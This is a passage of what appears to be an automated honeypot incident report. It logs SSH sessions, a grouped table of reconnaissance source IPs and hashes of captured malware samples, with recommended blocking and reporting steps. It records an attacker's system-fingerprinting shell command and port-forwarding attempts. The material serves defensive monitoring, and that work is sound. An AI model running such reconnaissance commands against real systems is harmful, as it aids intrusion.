| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:51:14` | `cowrie.session.connect` |
| `2026-08-16 02:51:14` | `cowrie.client.version` |
| `2026-08-16 02:51:14` | `cowrie.client.kex` |
| `2026-08-16 02:51:15` | `cowrie.login.success` |
| `2026-08-16 02:51:17` | `cowrie.session.params` |
| `2026-08-16 02:51:17` | `cowrie.command.input` |
| `2026-08-16 02:51:17` | `cowrie.command.input` |
| `2026-08-16 02:51:17` | `cowrie.command.input` |
| `2026-08-16 02:51:17` | `cowrie.command.input` |
| `2026-08-16 02:51:17` | `cowrie.command.input` |
| `2026-08-16 02:51:17` | `cowrie.command.success` |
| `2026-08-16 02:51:17` | `cowrie.command.input` |
| `2026-08-16 02:51:17` | `cowrie.command.input` |
| `2026-08-16 02:51:17` | `cowrie.command.input` |
| `2026-08-16 02:51:17` | `cowrie.command.input` |
| `2026-08-16 02:51:17` | `cowrie.log.closed` |
| `2026-08-16 02:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3bcab43e2d4

| Field | Detail |
|---|---|
| **Source IP** | `94.228.240[.]2` |
| **First Seen** | 2026-08-16 02:51 |
| **Last Seen** | 2026-08-16 02:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:51:31` | `cowrie.session.connect` |
| `2026-08-16 02:51:31` | `cowrie.client.version` |
| `2026-08-16 02:51:31` | `cowrie.client.kex` |
| `2026-08-16 02:51:32` | `cowrie.login.success` |
| `2026-08-16 02:51:32` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.228.240[.]2` to AbuseIPDB if not already reported
- [ ] Block `94.228.240[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8662648d101f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:52 |
| **Last Seen** | 2026-08-16 02:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:52:11` | `cowrie.session.connect` |
| `2026-08-16 02:52:12` | `cowrie.client.version` |
| `2026-08-16 02:52:12` | `cowrie.client.kex` |
| `2026-08-16 02:52:13` | `cowrie.login.success` |
| `2026-08-16 02:52:14` | `cowrie.session.params` |
| `2026-08-16 02:52:14` | `cowrie.command.input` |
| `2026-08-16 02:52:14` | `cowrie.command.input` |
| `2026-08-16 02:52:14` | `cowrie.command.input` |
| `2026-08-16 02:52:14` | `cowrie.command.input` |
| `2026-08-16 02:52:14` | `cowrie.command.input` |
| `2026-08-16 02:52:14` | `cowrie.command.success` |
| `2026-08-16 02:52:14` | `cowrie.command.input` |
| `2026-08-16 02:52:14` | `cowrie.command.input` |
| `2026-08-16 02:52:14` | `cowrie.command.input` |
| `2026-08-16 02:52:14` | `cowrie.command.input` |
| `2026-08-16 02:52:15` | `cowrie.log.closed` |
| `2026-08-16 02:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ce16780c05a

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 02:52 |
| **Last Seen** | 2026-08-16 02:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:52:59` | `cowrie.session.connect` |
| `2026-08-16 02:53:00` | `cowrie.client.version` |
| `2026-08-16 02:53:00` | `cowrie.client.kex` |
| `2026-08-16 02:53:00` | `cowrie.login.success` |
| `2026-08-16 02:53:01` | `cowrie.session.params` |
| `2026-08-16 02:53:01` | `cowrie.command.input` |
| `2026-08-16 02:53:01` | `cowrie.log.closed` |
| `2026-08-16 02:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dd2a4dae931

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:53 |
| **Last Seen** | 2026-08-16 02:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:53:09` | `cowrie.session.connect` |
| `2026-08-16 02:53:10` | `cowrie.client.version` |
| `2026-08-16 02:53:10` | `cowrie.client.kex` |
| `2026-08-16 02:53:11` | `cowrie.login.success` |
| `2026-08-16 02:53:13` | `cowrie.session.params` |
| `2026-08-16 02:53:13` | `cowrie.command.input` |
| `2026-08-16 02:53:13` | `cowrie.command.input` |
| `2026-08-16 02:53:13` | `cowrie.command.input` |
| `2026-08-16 02:53:13` | `cowrie.command.input` |
| `2026-08-16 02:53:13` | `cowrie.command.input` |
| `2026-08-16 02:53:13` | `cowrie.command.success` |
| `2026-08-16 02:53:13` | `cowrie.command.input` |
| `2026-08-16 02:53:13` | `cowrie.command.input` |
| `2026-08-16 02:53:13` | `cowrie.command.input` |
| `2026-08-16 02:53:13` | `cowrie.command.input` |
| `2026-08-16 02:53:14` | `cowrie.log.closed` |
| `2026-08-16 02:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f1e3c0566d6

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]101` |
| **First Seen** | 2026-08-16 02:54 |
| **Last Seen** | 2026-08-16 02:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:54:09` | `cowrie.session.connect` |
| `2026-08-16 02:54:10` | `cowrie.client.version` |
| `2026-08-16 02:54:10` | `cowrie.client.kex` |
| `2026-08-16 02:54:12` | `cowrie.login.success` |
| `2026-08-16 02:54:12` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]101` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8ddb6fdc5c2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:54 |
| **Last Seen** | 2026-08-16 02:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:54:10` | `cowrie.session.connect` |
| `2026-08-16 02:54:12` | `cowrie.client.version` |
| `2026-08-16 02:54:12` | `cowrie.client.kex` |
| `2026-08-16 02:54:14` | `cowrie.login.success` |
| `2026-08-16 02:54:15` | `cowrie.session.params` |
| `2026-08-16 02:54:15` | `cowrie.command.input` |
| `2026-08-16 02:54:15` | `cowrie.command.input` |
| `2026-08-16 02:54:15` | `cowrie.command.input` |
| `2026-08-16 02:54:15` | `cowrie.command.input` |
| `2026-08-16 02:54:15` | `cowrie.command.input` |
| `2026-08-16 02:54:15` | `cowrie.command.success` |
| `2026-08-16 02:54:15` | `cowrie.command.input` |
| `2026-08-16 02:54:15` | `cowrie.command.input` |
| `2026-08-16 02:54:15` | `cowrie.command.input` |
| `2026-08-16 02:54:15` | `cowrie.command.input` |
| `2026-08-16 02:54:16` | `cowrie.log.closed` |
| `2026-08-16 02:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f8ea2e71ef

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-08-16 02:54 |
| **Last Seen** | 2026-08-16 02:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:54:18` | `cowrie.session.connect` |
| `2026-08-16 02:54:19` | `cowrie.client.version` |
| `2026-08-16 02:54:19` | `cowrie.client.kex` |
| `2026-08-16 02:54:21` | `cowrie.login.success` |
| `2026-08-16 02:54:21` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f451396e38b2

| Field | Detail |
|---|---|
| **Source IP** | `61.145.181[.]7` |
| **First Seen** | 2026-08-16 02:54 |
| **Last Seen** | 2026-08-16 02:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:54:21` | `cowrie.session.connect` |
| `2026-08-16 02:54:21` | `cowrie.client.version` |
| `2026-08-16 02:54:21` | `cowrie.client.kex` |
| `2026-08-16 02:54:24` | `cowrie.login.success` |
| `2026-08-16 02:54:25` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.181[.]7` to AbuseIPDB if not already reported
- [ ] Block `61.145.181[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e585f0d2ce76

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-08-16 02:54 |
| **Last Seen** | 2026-08-16 02:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:54:30` | `cowrie.session.connect` |
| `2026-08-16 02:54:30` | `cowrie.client.version` |
| `2026-08-16 02:54:30` | `cowrie.client.kex` |
| `2026-08-16 02:54:31` | `cowrie.login.success` |
| `2026-08-16 02:54:32` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **4954** | 2026-08-16 00:55 | 2026-08-16 02:54 | 5951m | 0 | `T1592` | 🟠 MEDIUM |
| `107.150.146[.]69` | **19** | 2026-08-16 00:57 | 2026-08-16 02:48 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-16 01:03 | 2026-08-16 02:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **5** | 2026-08-16 01:04 | 2026-08-16 02:29 | 1m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-08-16 01:27 | 2026-08-16 01:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-08-16 00:57 | 2026-08-16 00:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | **2** | 2026-08-16 00:55 | 2026-08-16 02:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.83.23[.]169` | 1 | 2026-08-16 02:46 | 2026-08-16 02:46 | 1s | 0 | `T1592` | 🟢 LOW |
| `109.63.193[.]146` | 1 | 2026-08-16 02:46 | 2026-08-16 02:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.177.172[.]94` | 1 | 2026-08-16 01:17 | 2026-08-16 01:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `125.122.39[.]118` | 1 | 2026-08-16 02:45 | 2026-08-16 02:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]10` | 1 | 2026-08-16 02:51 | 2026-08-16 02:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.200[.]211` | 1 | 2026-08-16 02:45 | 2026-08-16 02:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `188.240.59[.]39` | 1 | 2026-08-16 00:59 | 2026-08-16 00:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `188.240.59[.]9` | 1 | 2026-08-16 00:59 | 2026-08-16 00:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.50.235[.]138` | 1 | 2026-08-16 01:30 | 2026-08-16 01:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.206.182[.]211` | 1 | 2026-08-16 01:30 | 2026-08-16 01:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.81.189[.]110` | 1 | 2026-08-16 02:17 | 2026-08-16 02:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `218.146.255[.]221` | 1 | 2026-08-16 02:01 | 2026-08-16 02:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-08-16 01:02 | 2026-08-16 01:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-08-16 01:04 | 2026-08-16 01:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-08-16 02:35 | 2026-08-16 02:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.223.176[.]171` | 1 | 2026-08-16 02:51 | 2026-08-16 02:51 | 5s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]227` | 1 | 2026-08-16 02:27 | 2026-08-16 02:27 | 18s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-08-16 01:38 | 2026-08-16 01:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.191.181[.]23` | 1 | 2026-08-16 01:44 | 2026-08-16 01:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]1` | 1 | 2026-08-16 01:06 | 2026-08-16 01:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]4` | 1 | 2026-08-16 01:56 | 2026-08-16 01:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.23.88[.]161` | 1 | 2026-08-16 01:21 | 2026-08-16 01:22 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-16 01:45 | 2026-08-16 01:46 | 49s | 0 | `T1592` | 🟢 LOW |
| `98.82.1[.]192` | 1 | 2026-08-16 01:19 | 2026-08-16 01:19 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
